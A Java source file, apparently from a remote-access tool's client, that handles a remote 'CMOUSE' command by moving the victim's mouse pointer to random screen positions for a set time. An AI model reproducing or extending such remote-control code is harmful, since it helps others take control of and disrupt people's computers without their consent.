package com.redpois0n.packets.incoming;

import java.awt.Rectangle;
import java.awt.Toolkit;
import java.util.Random;

import com.redpois0n.Connection;
import com.redpois0n.Main;

public class PacketCMOUSE extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		final int time = Connection.readInt();
		new Thread() {
			public void run() {
				try {
					int t = time;
					Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
					int height = (int) screenRect.getHeight();
					int width = (int) screenRect.getWidth();
					Random random = new Random();
					for (int i = 0; i < t * 4; i++) {
						Main.robot.mouseMove(random.nextInt(width), random.nextInt(height));
						Thread.sleep(250L);
					}
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
		}.start();
	}

}
